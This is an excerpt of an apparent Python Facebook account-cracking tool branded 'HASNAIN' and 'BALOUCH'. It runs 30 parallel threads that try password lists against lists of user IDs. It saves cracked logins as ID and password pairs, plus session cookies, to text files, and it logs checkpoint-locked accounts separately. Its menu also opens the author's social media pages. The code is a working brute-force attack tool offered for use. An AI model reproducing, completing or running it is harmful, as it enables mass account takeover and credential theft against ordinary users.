...
def HASNAIN():
		...
		if shm =='1':
			os.system("xdg-open https://www.facebook.com/profile.php?id=100086494785247&mibextid=ZbWKwL/")
			file_crack()
		elif shm =='2':
			os.system("xdg-open https://www.facebook.com/profile.php?id=100086494785247&mibextid=ZbWKwL")
			r_crack()
			...
			os.system('xdg-open https://youtube.com/@BALOUCH _48')
			HASNAIN()
		elif shm =='9':
...
def file_crack():
	...
	with tred(max_workers=30) as HASNAIN:
		clear()
		tl = str(len(fo))
		...
		print("\33[1;37m [+] Your Cp/Ok Id Save In HASNAIN Folder")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				HASNAIN.submit(api1,ids,names,passlist)
			else:
				HASNAIN.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def pak():
	...
	with tred(max_workers=30) as HASNAIN:
		...
		for psx in user:
			...
			HASNAIN.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	...
	try:
		...
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[BALOUCH -OK] '+uid+' | '+pas)		                    
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'HASNAIN_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'HASNAIN_COOKIES.txt')
					...
					#	print(f'\r\r\33[1m\33[1;35m [BALOUCH -CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'HASNAIN-CP.txt')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [BALOUCH -OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'HASNAIN_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
			#		print(f'\r\r\33[1m\33[1;35m [BALOUCH -CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'BALOUCH -CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
